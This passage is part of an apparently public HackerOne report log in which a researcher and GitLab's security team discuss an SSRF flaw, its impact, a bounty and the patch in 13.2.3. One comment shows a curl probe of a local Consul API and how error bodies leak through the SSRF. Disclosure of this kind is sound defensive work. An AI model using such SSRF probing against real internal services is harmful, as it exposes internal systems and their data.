Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-04-22T04:05:53.135Z","updated_at":"2020-04-22T04:05:53.135Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8525876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\nJust checking in regarding this issue, looks like it didn't make the 2020-06-30 security patch?\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dcouture\"\u003e@dcouture\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eJust checking in regarding this issue, looks like it didn\u0026#39;t make the 2020-06-30 security patch?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-07T10:43:29.395Z","updated_at":"2020-07-07T10:43:29.395Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8527298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nIndeed it missed the release but should make it to the next one, the work to fix it is nearly completed.\n\nBest regards,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIndeed it missed the release but should make it to the next one, the work to fix it is nearly completed.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-07T13:32:30.345Z","updated_at":"2020-07-07T13:32:30.345Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8531685,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello again @vakzz,\n\nI just want to confirm that my assessment of the impact matches with your testing: the status code from the forged request is the only information you're able to read from the SSRF. Is that correct?\n\nThanks,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHello again \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI just want to confirm that my assessment of the impact matches with your testing: the status code from the forged request is the only information you\u0026#39;re able to read from the SSRF. Is that correct?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-07T21:11:10.583Z","updated_at":"2020-07-07T21:11:10.583Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8532708,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\nSorry it's been a while so had to recheck a few things!\n\nWith the SSRF you can get the status code and the body only if the request fails. For example hitting an invalid route in Consul directly with curl gives:\n```bash\n$ curl -v localhost:8500/v1/config\n*   Trying ::1...\n* TCP_NODELAY set\n* Connected to localhost (::1) port 8500 (#0)\n\u003e GET /v1/config HTTP/1.1\n\u003e Host: localhost:8500\n\u003e User-Agent: curl/7.64.1\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 405 Method Not Allowed\n\u003c Allow: OPTIONS,PUT\n\u003c Vary: Accept-Encoding\n\u003c Date: Tue, 07 Jul 2020 23:29:31 GMT\n\u003c Content-Length: 22\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c\n* Connection #0 to host localhost left intact\nmethod GET not allowed* Closing connection 0\n```\n\nWhen using the SSRF you can see the body is returned in the ` remote:` section:\n```\n2:Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\n```\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dcouture\"\u003e@dcouture\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry it\u0026#39;s been a while so had to recheck a few things!\u003c/p\u003e\n\n\u003cp\u003eWith the SSRF you can get the status code and the body only if the request fails. For example hitting an invalid route in Consul directly with curl gives:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e localhost:8500/v1/config\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e   Trying ::1...\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e TCP_NODELAY \u003cspan class=\"nb\"\u003eset\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connected to localhost \u003cspan class=\"o\"\u003e(\u003c/span\u003e::1\u003cspan class=\"o\"\u003e)\u003c/span\u003e port 8500 \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"c\"\u003e#0)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e GET /v1/config HTTP/1.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Host: localhost:8500\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e User-Agent: curl/7.64.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Accept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u0026lt; HTTP/1.1 405 Method Not Allowed\n\u0026lt; Allow: OPTIONS,PUT\n\u0026lt; Vary: Accept-Encoding\n\u0026lt; Date: Tue, 07 Jul 2020 23:29:31 GMT\n\u0026lt; Content-Length: 22\n\u0026lt; Content-Type: text/plain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u0026lt;\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connection \u003cspan class=\"c\"\u003e#0 to host localhost left intact\u003c/span\u003e\nmethod GET not allowed\u003cspan class=\"k\"\u003e*\u003c/span\u003e Closing connection 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen using the SSRF you can see the body is returned in the \u003ccode\u003eremote:\u003c/code\u003e section:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2:Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access \u0026#39;http://google.com/v1/config?/\u0026#39;: The requested URL returned error: 405\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-07T23:32:06.888Z","updated_at":"2020-07-07T23:32:06.888Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8742838,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @vakzz,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\n\nWe will continue to keep you updated via HackerOne as a fix is scheduled.\n\nBest regards,\nDominic\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to keep you updated via HackerOne as a fix is scheduled.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-24T14:08:02.963Z","updated_at":"2020-07-24T14:08:02.963Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8866554,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @vakzz ,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nVitor\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-06T15:16:53.725Z","updated_at":"2020-08-06T15:16:53.725Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9160236,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-08T13:30:35.151Z","updated_at":"2020-09-08T13:30:35.151Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9160365,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-08T13:46:02.153Z","updated_at":"2020-09-08T13:46:02.153Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9160366,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-08T13:46:02.195Z","updated_at":"2020-09-08T13:46:02.195Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}